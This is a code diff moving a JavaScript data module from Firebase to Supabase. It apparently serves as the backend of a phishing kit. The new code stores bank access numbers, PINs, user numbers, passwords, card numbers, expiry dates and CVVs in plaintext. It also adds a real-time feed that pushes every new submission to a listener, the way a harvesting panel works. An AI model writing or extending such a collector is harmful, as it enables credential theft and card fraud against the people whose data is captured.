@@ -1,32 +1,33 @@
-import { collection, addDoc, onSnapshot, orderBy, query } from 'firebase/firestore';
-import { db } from './firebase';
+import { supabase } from './firebase';
 
-// Save complete user data (Step 3 - Final)
 export const saveCompleteUserData = async (completeData) => {
-  try {
-    const userData = {
-      ...completeData,
-      completedAt: new Date().toISOString(),
-      status: 'completed'
-    };
-    
-    const docRef = await addDoc(collection(db, 'complete_user_data'), userData);
-    console.log('Complete user data saved with ID:', docRef.id);
-    return docRef.id;
-  } catch (error) {
-    console.error('Error saving complete user data:', error);
-    throw error;
-  }
+  const { accessNumber, pin, userNumber, password, cardNumber, expiryDate, cvv } = completeData;
+  const { data, error } = await supabase
+    .from('complete_user_data')
+    .insert([{ accessNumber, pin, userNumber, password, cardNumber, expiryDate, cvv, completedAt: new Date().toISOString(), status: 'completed' }])
+    .select();
+
+  if (error) { console.error('Supabase insert error:', error); throw error; }
+  return data[0].id;
 };
 
-// Subscribe to complete user data in real-time
+export const fetchUserData = async () => {
+  const { data, error } = await supabase
+    .from('complete_user_data')
+    .select('*')
+    .order('completedAt', { ascending: false });
+
+  if (error) throw error;
+  return data;
+};
+
 export const subscribeToUserData = (callback) => {
-  const q = query(collection(db, 'complete_user_data'), orderBy('completedAt', 'desc'));
-  return onSnapshot(q, (snapshot) => {
-    const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
-    callback(data);
-  }, (error) => {
-    console.error('Snapshot error:', error);
-    callback([]);
-  });
+  const channel = supabase
+    .channel('complete_user_data_changes')
+    .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'complete_user_data' },
+      () => { fetchUserData().then(callback); }
+    )
+    .subscribe();
+
+  return () => supabase.removeChannel(channel);
 };
